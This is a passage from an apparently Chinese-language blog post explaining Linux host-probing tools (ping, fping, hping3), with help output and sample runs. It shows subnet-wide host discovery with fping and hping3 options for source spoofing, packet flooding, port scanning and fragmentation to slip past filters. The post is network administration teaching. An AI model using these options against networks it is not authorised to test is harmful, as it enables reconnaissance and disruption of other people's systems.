      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux Ping工具汇总</title>
    <url>/linux-ping-tools/</url>
    <content><![CDATA[<p>大家都应该熟悉ping这个网络诊断工具，它用来检测网络是否连通以及目的主机是否在线。然而唯一缺点是它只支持ICMP协议。因此，大多数主机都会防火墙过滤ICMP数据包，不过，Linux下也有跟他类似的ping工具，本文将会介绍一些常见的工具。</p>
<p><img src="/uploads/images/imgs/command-87198_640.jpg" alt="" /></p>
<span id="more"></span>
<h3 id="ping"><a class="markdownIt-Anchor" href="#ping"></a> ping</h3>
<p>一般作为所有系统默认自带的 <code>ping</code> ，它同样也很重要。通过 <code>man ping</code> 来查看ping的帮助手册</p>
<figure class="highlight inform7"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs inform7">ping  <span class="hljs-comment">[-aAbBdDfhLnOqrRUvV46]</span> <span class="hljs-comment">[-c count]</span> <span class="hljs-comment">[-F flowlabel]</span> <span class="hljs-comment">[-i interval]</span> <span class="hljs-comment">[-I interface]</span><br>       <span class="hljs-comment">[-l preload]</span> <span class="hljs-comment">[-m mark]</span> <span class="hljs-comment">[-M pmtudisc_option]</span> <span class="hljs-comment">[-N nodeinfo_option]</span> <span class="hljs-comment">[-w deadline]</span>  <span class="hljs-comment">[-W</span><br><span class="hljs-comment">       timeout]</span>  <span class="hljs-comment">[-p  pattern]</span> <span class="hljs-comment">[-Q tos]</span> <span class="hljs-comment">[-s packetsize]</span> <span class="hljs-comment">[-S sndbuf]</span> <span class="hljs-comment">[-t ttl]</span> <span class="hljs-comment">[-T timestamp</span><br><span class="hljs-comment">       option]</span> <span class="hljs-comment">[hop ...]</span> destination<br></code></pre></div></td></tr></table></figure>
<p>常用的也就是 -c(发送数据包的数量)，-s(发送数据的字节大小)，-I(网络接口)</p>
<figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">&gt;<span class="hljs-built_in"> ping </span>baidu.com -c 2 -s 64<span class="hljs-built_in"></span><br><span class="hljs-built_in">PING </span>baidu.com (111.13.101.208) 64(92) bytes of data.<br>72 bytes <span class="hljs-keyword">from</span> 111.13.101.208 (111.13.101.208): <span class="hljs-attribute">icmp_seq</span>=1 <span class="hljs-attribute">ttl</span>=55 <span class="hljs-attribute">time</span>=44.2 ms<br>72 bytes <span class="hljs-keyword">from</span> 111.13.101.208 (111.13.101.208): <span class="hljs-attribute">icmp_seq</span>=2 <span class="hljs-attribute">ttl</span>=55 <span class="hljs-attribute">time</span>=43.4 ms<br>--- baidu.com<span class="hljs-built_in"> ping </span>statistics ---<br>2 packets transmitted, 2 received, 0% packet loss, time 1017ms<br>rtt min/avg/max/mdev = 43.490/43.873/44.257/0.436 ms<br></code></pre></div></td></tr></table></figure>
<p>假如我要ping一个主机的IPv6地址，那么可以这样做(必须指定 -I eth0)</p>
<figure class="highlight elixir"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs elixir">&gt; ping -I eth0 fe80::<span class="hljs-number">2605</span><span class="hljs-symbol">:fff</span><span class="hljs-symbol">:fe41</span><span class="hljs-symbol">:e387</span> -c <span class="hljs-number">2</span><br>PING fe80::<span class="hljs-number">2605</span><span class="hljs-symbol">:fff</span><span class="hljs-symbol">:fe41</span><span class="hljs-symbol">:e387</span>(fe80::<span class="hljs-number">2605</span><span class="hljs-symbol">:fff</span><span class="hljs-symbol">:fe41</span><span class="hljs-symbol">:e387</span>) from fe80::<span class="hljs-number">2</span><span class="hljs-symbol">cca:</span><span class="hljs-symbol">ff77:</span><span class="hljs-number">78</span><span class="hljs-symbol">dc:</span><span class="hljs-number">1025</span>%eth0 <span class="hljs-symbol">eth0:</span> <span class="hljs-number">56</span> data bytes<br><span class="hljs-number">64</span> bytes from fe80::<span class="hljs-number">2605</span><span class="hljs-symbol">:fff</span><span class="hljs-symbol">:fe41</span><span class="hljs-symbol">:e387%eth0</span>: icmp_seq=<span class="hljs-number">1</span> ttl=<span class="hljs-number">255</span> time=<span class="hljs-number">1.67</span> ms<br><span class="hljs-number">64</span> bytes from fe80::<span class="hljs-number">2605</span><span class="hljs-symbol">:fff</span><span class="hljs-symbol">:fe41</span><span class="hljs-symbol">:e387%eth0</span>: icmp_seq=<span class="hljs-number">2</span> ttl=<span class="hljs-number">255</span> time=<span class="hljs-number">4.43</span> ms<br>--- fe80::<span class="hljs-number">2605</span><span class="hljs-symbol">:fff</span><span class="hljs-symbol">:fe41</span><span class="hljs-symbol">:e387</span> ping statistics ---<br><span class="hljs-number">2</span> packets transmitted, <span class="hljs-number">2</span> received, 0% packet loss, time <span class="hljs-number">1001</span>ms<br>rtt min/avg/max/mdev = <span class="hljs-number">1.671</span>/<span class="hljs-number">3.054</span>/<span class="hljs-number">4.438</span>/<span class="hljs-number">1.384</span> ms<br></code></pre></div></td></tr></table></figure>
<p>或者 <strong>ping6 -I eth0 fe80::2605:fff:fe41:e387 -c 2</strong></p>
<h3 id="fping"><a class="markdownIt-Anchor" href="#fping"></a> fping</h3>
<p>相对来说fping比ping要高级点(<strong>也是通过ICMP协议来发送数据包的</strong>)，他可以向多个目标主机发送ping，也可以指定一个主机列表文件。其中，fping的 <strong>-g</strong> 选项比较重要</p>
<blockquote>
<p><strong>-g, –generate</strong> generate target list (only if no -f specified)<br />
(give start and end IP in the target list, or a <strong>CIDR address</strong>)<br />
(ex. fping -g 192.168.1.0 192.168.1.255 or fping -g 192.168.1.0/24)</p>
</blockquote>
<figure class="highlight vhdl"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vhdl">fping <span class="hljs-comment">--help</span><br>Usage: fping [options] [targets...]<br>Probing options:<br>   -<span class="hljs-number">4</span>, <span class="hljs-comment">--ipv4         only ping IPv4 addresses</span><br>   -<span class="hljs-number">6</span>, <span class="hljs-comment">--ipv6         only ping IPv6 addresses</span><br>   -b, <span class="hljs-comment">--size=BYTES   amount of ping data to send, in bytes (default: 56)</span><br>   -B, <span class="hljs-comment">--backoff=N    set exponential backoff factor to N (default: 1.5)</span><br>   -c, <span class="hljs-comment">--count=N      count mode: send N pings to each target</span><br>   -f, <span class="hljs-comment">--file=FILE    read list of targets from a file ( - means stdin)</span><br>   -g, <span class="hljs-comment">--generate     generate target list (only if no -f specified)</span><br>                      (give start <span class="hljs-keyword">and</span> <span class="hljs-keyword">end</span> IP <span class="hljs-keyword">in</span> the target list, <span class="hljs-keyword">or</span> a CIDR address)<br>                      (ex. fping -g <span class="hljs-number">192.168</span>.<span class="hljs-number">1.0</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">1.255</span> <span class="hljs-keyword">or</span> fping -g <span class="hljs-number">192.168</span>.<span class="hljs-number">1.0</span>/<span class="hljs-number">24</span>)<br>   -H, <span class="hljs-comment">--ttl=N        set the IP TTL value (Time To Live hops)</span><br>   -I, <span class="hljs-comment">--iface=IFACE  bind to a particular interface</span><br>   -l, <span class="hljs-comment">--loop         loop mode: send pings forever</span><br>   -m, <span class="hljs-comment">--all          use all IPs of provided hostnames (e.g. IPv4 and IPv6), use with -A</span><br>   -M, <span class="hljs-comment">--dontfrag     set the Don&#x27;t Fragment flag</span><br>   -O, <span class="hljs-comment">--tos=N        set the type of service (tos) flag on the ICMP packets</span><br>   -p, <span class="hljs-comment">--period=MSEC  interval between ping packets to one target (in ms)</span><br>                      (<span class="hljs-keyword">in</span> <span class="hljs-keyword">loop</span> <span class="hljs-keyword">and</span> count modes, <span class="hljs-keyword">default</span>: <span class="hljs-number">1000</span> ms)<br>   -r, <span class="hljs-comment">--retry=N      number of retries (default: 3)</span><br>   -R, <span class="hljs-comment">--random       random packet data (to foil link data compression)</span><br>   -S, <span class="hljs-comment">--src=IP       set source address</span><br>   -t, <span class="hljs-comment">--timeout=MSEC individual target initial timeout (default: 500 ms,</span><br>                      except <span class="hljs-keyword">with</span> -l/-c/-C, where it<span class="hljs-symbol">&#x27;s</span> the -p period up <span class="hljs-keyword">to</span> <span class="hljs-number">2000</span> ms)<br>Output options:<br>   -a, <span class="hljs-comment">--alive        show targets that are alive</span><br>   -A, <span class="hljs-comment">--addr         show targets by address</span><br>   -C, <span class="hljs-comment">--vcount=N     same as -c, report results in verbose format</span><br>   -D, <span class="hljs-comment">--timestamp    print timestamp before each output line</span><br>   -e, <span class="hljs-comment">--elapsed      show elapsed time on return packets</span><br>   -i, <span class="hljs-comment">--interval=MSEC  interval between sending ping packets (default: 10 ms)</span><br>   -n, <span class="hljs-comment">--name         show targets by name (-d is equivalent)</span><br>   -N, <span class="hljs-comment">--netdata      output compatible for netdata (-l -Q are required)</span><br>   -o, <span class="hljs-comment">--outage       show the accumulated outage time (lost packets * packet interval)</span><br>   -q, <span class="hljs-comment">--quiet        quiet (don&#x27;t show per-target/per-ping results)</span><br>   -Q, <span class="hljs-comment">--squiet=SECS  same as -q, but show summary every n seconds</span><br>   -s, <span class="hljs-comment">--stats        print final stats</span><br>   -u, <span class="hljs-comment">--unreach      show targets that are unreachable</span><br>   -v, <span class="hljs-comment">--version      show version</span><br></code></pre></div></td></tr></table></figure>
<p>用法如下</p>
<figure class="highlight gradle"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gradle">&gt; fping -I eth0 -b <span class="hljs-number">64</span> -f list_targets -a -q -s<br><span class="hljs-number">192.168</span>.<span class="hljs-number">1.16</span>  : xmt<span class="hljs-regexp">/rcv/</span>%loss = <span class="hljs-number">2</span><span class="hljs-regexp">/2/</span><span class="hljs-number">0</span>%, min<span class="hljs-regexp">/avg/m</span>ax = <span class="hljs-number">58.0</span><span class="hljs-regexp">/74.1/</span><span class="hljs-number">90.1</span><br><span class="hljs-number">192.168</span>.<span class="hljs-number">1.15</span>  : xmt<span class="hljs-regexp">/rcv/</span>%loss = <span class="hljs-number">2</span><span class="hljs-regexp">/0/</span><span class="hljs-number">100</span>%<br><span class="hljs-number">192.168</span>.<span class="hljs-number">1.110</span> : xmt<span class="hljs-regexp">/rcv/</span>%loss = <span class="hljs-number">2</span><span class="hljs-regexp">/2/</span><span class="hljs-number">0</span>%, min<span class="hljs-regexp">/avg/m</span>ax = <span class="hljs-number">1.48</span><span class="hljs-regexp">/3.39/</span><span class="hljs-number">5.31</span><br>       <span class="hljs-number">3</span> targets<br>       <span class="hljs-number">2</span> alive<br>       <span class="hljs-number">1</span> unreachable<br>       <span class="hljs-number">0</span> unknown addresses<br>       <span class="hljs-number">1</span> timeouts (waiting <span class="hljs-keyword">for</span> response)<br>       <span class="hljs-number">6</span> ICMP Echos sent<br>       <span class="hljs-number">4</span> ICMP Echo Replies received<br>       <span class="hljs-number">0</span> other ICMP received<br> <span class="hljs-number">1.48</span> ms (min <span class="hljs-keyword">round</span> trip time)<br> <span class="hljs-number">38.7</span> ms (avg <span class="hljs-keyword">round</span> trip time)<br> <span class="hljs-number">90.1</span> ms (max <span class="hljs-keyword">round</span> trip time)<br>        <span class="hljs-number">2.022</span> sec (elapsed real time)<br><br></code></pre></div></td></tr></table></figure>
<p>-b 指定发送数据字节大小<br />
-f 指定一个目标主机列表文件，每行一个地址<br />
-a 只显示可以ping通的目标主机<br />
-q 安静模式，不显示在ping时的每个主机的结果<br />
-s 最后显示总计结果<br />
-r 重试次数，默认:3<br />
还可以指定 -g 来扫描局域网下所有主机</p>
<figure class="highlight accesslog"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs accesslog">&gt; fping -asgq <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span>/<span class="hljs-number">24</span><br><span class="hljs-number">192.168.1.1</span><br><span class="hljs-number">192.168.1.11</span><br><span class="hljs-number">192.168.1.6</span><br><span class="hljs-number">192.168.1.16</span><br><span class="hljs-number">192.168.1.3</span><br><span class="hljs-number">192.168.1.5</span><br><span class="hljs-number">192.168.1.12</span><br><span class="hljs-number">192.168.1.9</span><br><span class="hljs-number">192.168.1.105</span><br><span class="hljs-number">192.168.1.108</span><br><span class="hljs-number">192.168.1.110</span><br>     <span class="hljs-number">254</span> targets<br>      <span class="hljs-number">11</span> alive<br>     <span class="hljs-number">243</span> unreachable<br>       <span class="hljs-number">0</span> unknown addresses<br>     <span class="hljs-number">243</span> timeouts (waiting for response)<br>     <span class="hljs-number">983</span> ICMP Echos sent<br>      <span class="hljs-number">11</span> ICMP Echo Replies received<br>     <span class="hljs-number">964</span> other ICMP received<br> <span class="hljs-number">0</span>.<span class="hljs-number">04</span> ms (min round trip time)<br> <span class="hljs-number">88</span>.<span class="hljs-number">2</span> ms (avg round trip time)<br> <span class="hljs-number">268</span> ms (max round trip time)<br>       <span class="hljs-number">11</span>.<span class="hljs-number">633</span> sec (elapsed real time)<br></code></pre></div></td></tr></table></figure>
<p>通过 -u 可以显示主机不可达的地址，如: <code>fping -usgq 192.168.1.0/24</code></p>
<h3 id="hping3"><a class="markdownIt-Anchor" href="#hping3"></a> hping3</h3>
<p>这个hping3就比较强大的，它支持的协议有TCP，UDP，ICMP，支持使用tcl脚本。<br />
主要用途：</p>
<ul>
<li><strong>测试防火墙规则</strong></li>
<li>测试入侵检测系统(IDS)</li>
<li>测试TCP/IP模式的安全漏洞</li>
</ul>
<p>对于一些主机的防火墙过滤了ICMP数据包，那么我们可以使用hping3发送TCP数据包来判断主机是否存活</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli">&gt; hping3 -h<br>usage: hping3 host [options]<br>  -h  <span class="hljs-params">--help</span>      show this <span class="hljs-keyword">help</span><br>  -v  <span class="hljs-params">--version</span>   show <span class="hljs-keyword">version</span><br>  -c  <span class="hljs-params">--count</span>     packet count<br>  -i  <span class="hljs-params">--interval</span>  wait <span class="hljs-params">(uX for X microseconds, for example -i u1000)</span><br>      <span class="hljs-params">--fast</span>      <span class="hljs-keyword">alias</span> for -i u10000 <span class="hljs-params">(10 packets for second)</span><br>      <span class="hljs-params">--faster</span>    <span class="hljs-keyword">alias</span> for -i u1000 <span class="hljs-params">(100 packets for second)</span><br>      <span class="hljs-params">--flood</span>	   sent packets as fast as possible. Don&#x27;t show replies.<br>  -n  <span class="hljs-params">--numeric</span>   numeric output<br>  -q  <span class="hljs-params">--quiet</span>     quiet<br>  -I  <span class="hljs-params">--interface</span> interface name <span class="hljs-params">(otherwise default routing interface)</span><br>  -V  <span class="hljs-params">--verbose</span>   verbose mode<br>  -D  <span class="hljs-params">--debug</span>     debugging info<br>  -z  <span class="hljs-params">--bind</span>      bind ctrl+z to ttl           <span class="hljs-params">(default to dst port)</span><br>  -Z  <span class="hljs-params">--unbind</span>    unbind ctrl+z<br>      <span class="hljs-params">--beep</span>      beep for every matching packet received<br>Mode<br>  default mode     TCP<br>  -0  <span class="hljs-params">--rawip</span>      RAW IP mode<br>  -1  <span class="hljs-params">--icmp</span>       ICMP mode<br>  -2  <span class="hljs-params">--udp</span>        UDP mode<br>  -8  <span class="hljs-params">--scan</span>       SCAN mode.<br>                   Example: hping <span class="hljs-params">--scan</span> 1-30,70-90 -S www.target.host<br>  -9  <span class="hljs-params">--listen</span>     listen mode<br>IP<br>  -a  <span class="hljs-params">--spoof</span>      spoof source address<br>  <span class="hljs-params">--rand-dest</span>      random destionation address mode. see the man.<br>  <span class="hljs-params">--rand-source</span>    random source address mode. see the man.<br>  -t  <span class="hljs-params">--ttl</span>        ttl <span class="hljs-params">(default 64)</span><br>  -N  <span class="hljs-params">--id</span>         id <span class="hljs-params">(default random)</span><br>  -W  <span class="hljs-params">--winid</span>      use win* id byte ordering<br>  -r  <span class="hljs-params">--rel</span>        relativize id field          <span class="hljs-params">(to estimate host traffic)</span><br>  -f  <span class="hljs-params">--frag</span>       split packets in more frag.  <span class="hljs-params">(may pass weak acl)</span><br>  -x  <span class="hljs-params">--morefrag</span>   <span class="hljs-keyword">set</span> more fragments flag<br>  -y  <span class="hljs-params">--dontfrag</span>   <span class="hljs-keyword">set</span> don&#x27;t fragment flag<br>  -g  <span class="hljs-params">--fragoff</span>    <span class="hljs-keyword">set</span> the fragment offset<br>  -m  <span class="hljs-params">--mtu</span>        <span class="hljs-keyword">set</span> virtual mtu, implies <span class="hljs-params">--frag</span> <span class="hljs-keyword">if</span> packet size &gt; mtu<br>  -o  <span class="hljs-params">--tos</span>        type of service <span class="hljs-params">(default 0x00)</span>, <span class="hljs-keyword">try</span> <span class="hljs-params">--tos</span> <span class="hljs-keyword">help</span><br>  -G  <span class="hljs-params">--rroute</span>     includes RECORD_ROUTE option and display the route buffer<br>  <span class="hljs-params">--lsrr</span>           loose source routing and record route<br>  <span class="hljs-params">--ssrr</span>           strict source routing and record route<br>  -H  <span class="hljs-params">--ipproto</span>    <span class="hljs-keyword">set</span> the IP protocol field, only in RAW IP mode<br>ICMP<br>  -C  <span class="hljs-params">--icmptype</span>   icmp type <span class="hljs-params">(default echo request)</span><br>  -K  <span class="hljs-params">--icmpcode</span>   icmp code <span class="hljs-params">(default 0)</span><br>      <span class="hljs-params">--force-icmp</span> send all icmp types <span class="hljs-params">(default send only supported types)</span><br>      <span class="hljs-params">--icmp-gw</span>    <span class="hljs-keyword">set</span> gateway address for ICMP redirect <span class="hljs-params">(default 0.0.0.0)</span><br>      <span class="hljs-params">--icmp-ts</span>    Alias for <span class="hljs-params">--icmp</span> <span class="hljs-params">--icmptype</span> 13 <span class="hljs-params">(ICMP timestamp)</span><br>      <span class="hljs-params">--icmp-addr</span>  Alias for <span class="hljs-params">--icmp</span> <span class="hljs-params">--icmptype</span> 17 <span class="hljs-params">(ICMP address subnet mask)</span><br>      <span class="hljs-params">--icmp-help</span>  display <span class="hljs-keyword">help</span> for others icmp options<br>UDP/TCP<br>  -s  <span class="hljs-params">--baseport</span>   base source port             <span class="hljs-params">(default random)</span><br>  -p  <span class="hljs-params">--destport</span>   [+][+]&lt;port&gt; destination port<span class="hljs-params">(default 0)</span> ctrl+z inc/dec<br>  -k  <span class="hljs-params">--keep</span>       keep still source port<br>  -w  <span class="hljs-params">--win</span>        winsize <span class="hljs-params">(default 64)</span><br>  -O  <span class="hljs-params">--tcpoff</span>     <span class="hljs-keyword">set</span> fake tcp data offset     <span class="hljs-params">(instead of tcphdrlen / 4)</span><br>  -Q  <span class="hljs-params">--seqnum</span>     shows only tcp sequence number<br>  -b  <span class="hljs-params">--badcksum</span>   <span class="hljs-params">(try to)</span> send packets with a bad IP checksum<br>                   many systems will fix the IP checksum sending the packet<br>                   so you&#x27;ll get bad UDP/TCP checksum instead.<br>  -M  <span class="hljs-params">--setseq</span>     <span class="hljs-keyword">set</span> TCP sequence number<br>  -L  <span class="hljs-params">--setack</span>     <span class="hljs-keyword">set</span> TCP ack<br>  -F  <span class="hljs-params">--fin</span>        <span class="hljs-keyword">set</span> FIN flag<br>  -S  <span class="hljs-params">--syn</span>        <span class="hljs-keyword">set</span> SYN flag<br>  -R  <span class="hljs-params">--rst</span>        <span class="hljs-keyword">set</span> RST flag<br>  -P  <span class="hljs-params">--push</span>       <span class="hljs-keyword">set</span> PUSH flag<br>  -A  <span class="hljs-params">--ack</span>        <span class="hljs-keyword">set</span> ACK flag<br>  -U  <span class="hljs-params">--urg</span>        <span class="hljs-keyword">set</span> URG flag<br>  -X  <span class="hljs-params">--xmas</span>       <span class="hljs-keyword">set</span> X unused flag <span class="hljs-params">(0x40)</span><br>  -Y  <span class="hljs-params">--ymas</span>       <span class="hljs-keyword">set</span> Y unused flag <span class="hljs-params">(0x80)</span><br>  <span class="hljs-params">--tcpexitcode</span>    use last tcp-&gt;th_flags as exit code<br>  <span class="hljs-params">--tcp-mss</span>        enable the TCP MSS option with the given value<br>  <span class="hljs-params">--tcp-timestamp</span>  enable the TCP timestamp option to guess the HZ/uptime<br>Common<br>  -d  <span class="hljs-params">--data</span>       data size                    <span class="hljs-params">(default is 0)</span><br>  -E  <span class="hljs-params">--file</span>       data from file<br>  -e  <span class="hljs-params">--sign</span>       add &#x27;signature&#x27;<br>  -j  <span class="hljs-params">--dump</span>       dump packets in hex<br>  -J  <span class="hljs-params">--print</span>      dump printable characters<br>  -B  <span class="hljs-params">--safe</span>       enable &#x27;safe&#x27; protocol<br>  -u  <span class="hljs-params">--end</span>        tell you when <span class="hljs-params">--file</span> reached EOF and prevent rewind<br>  -T  <span class="hljs-params">--traceroute</span> traceroute mode              <span class="hljs-params">(implies --bind and --ttl 1)</span><br>  <span class="hljs-params">--tr-stop</span>        Exit when receive the first not ICMP in traceroute mode<br>  <span class="hljs-params">--tr-keep-ttl</span>    Keep the source TTL fixed, useful to monitor just one hop<br>  <span class="hljs-params">--tr-no-rtt</span>	    Don&#x27;t calculate/show RTT information in traceroute mode<br>ARS packet description <span class="hljs-params">(new, unstable)</span><br>  <span class="hljs-params">--apd-send</span>       Send the packet described with APD <span class="hljs-params">(see docs/APD.txt)</span><br></code></pre></div></td></tr></table></figure>
<p>可以通过一下选项指定发送数据包的协议</p>
<table>
<thead>
<tr>
<th>选项</th>
<th>选项全称</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>-0</td>
<td>–rawip</td>
<td>发送原始IP数据包</td>
</tr>
<tr>
<td>-1</td>
<td>–icmp</td>
<td>发送ICMP数据包</td>
</tr>
<tr>
<td>-2</td>
<td>–udp</td>
<td>发送UDP数据包</td>
</tr>
<tr>
<td>-8</td>
<td>–scan</td>
<td>扫描模式</td>
</tr>
<tr>
<td>-9</td>
<td>–listen</td>
<td>监听模式</td>
</tr>
</tbody>
</table>
<p>注意，默认是发送TCP数据包</p>
<table>
<thead>
<tr>
<th>选项</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>-S</td>
<td>SYN</td>
</tr>
<tr>
<td>-F</td>
<td>FIN</td>
</tr>
<tr>
<td>-R</td>
<td>RST</td>
</tr>
<tr>
<td>-P</td>
<td>PUSH</td>
</tr>
<tr>
<td>-A</td>
<td>ACK</td>
</tr>
<tr>
<td>-U</td>
<td>URG</td>
</tr>
<tr>
<td>-X</td>
<td>XMAS</td>
</tr>
<tr>
<td>-Y</td>
<td>YMAS</td>
</tr>
</tbody>
</table>
<h4 id="发送tcp数据包"><a class="markdownIt-Anchor" href="#发送tcp数据包"></a> 发送TCP数据包</h4>
<figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">&gt; hping3 -I eth0 -V --syn 192.168.1.110 -c 2<br>using eth0, addr: 192.168.1.108, MTU: 1500<br>HPING 192.168.1.110 (eth0 192.168.1.110): S set, 40 headers + 0 data bytes<br><span class="hljs-attribute">len</span>=46 <span class="hljs-attribute">ip</span>=192.168.1.110 <span class="hljs-attribute">ttl</span>=64 DF <span class="hljs-attribute">id</span>=10106 <span class="hljs-attribute">tos</span>=0 <span class="hljs-attribute">iplen</span>=40<br><span class="hljs-attribute">sport</span>=0 <span class="hljs-attribute">flags</span>=RA <span class="hljs-attribute">seq</span>=0 <span class="hljs-attribute">win</span>=0 <span class="hljs-attribute">rtt</span>=7.7 ms<br><span class="hljs-attribute">seq</span>=0 <span class="hljs-attribute">ack</span>=1839333390 <span class="hljs-attribute">sum</span>=88b4 <span class="hljs-attribute">urp</span>=0<br><span class="hljs-attribute">len</span>=46 <span class="hljs-attribute">ip</span>=192.168.1.110 <span class="hljs-attribute">ttl</span>=64 DF <span class="hljs-attribute">id</span>=10157 <span class="hljs-attribute">tos</span>=0 <span class="hljs-attribute">iplen</span>=40<br><span class="hljs-attribute">sport</span>=0 <span class="hljs-attribute">flags</span>=RA <span class="hljs-attribute">seq</span>=1 <span class="hljs-attribute">win</span>=0 <span class="hljs-attribute">rtt</span>=7.6 ms<br><span class="hljs-attribute">seq</span>=0 <span class="hljs-attribute">ack</span>=439379179 <span class="hljs-attribute">sum</span>=1ca3 <span class="hljs-attribute">urp</span>=0<br>--- 192.168.1.110 hping statistic ---<br>2 packets transmitted, 2 packets received, 0% packet loss<br>round-trip min/avg/max = 7.6/7.7/7.7 ms<br></code></pre></div></td></tr></table></figure>
<h4 id="端口检测"><a class="markdownIt-Anchor" href="#端口检测"></a> 端口检测</h4>
<p>-p 指定目的端口</p>
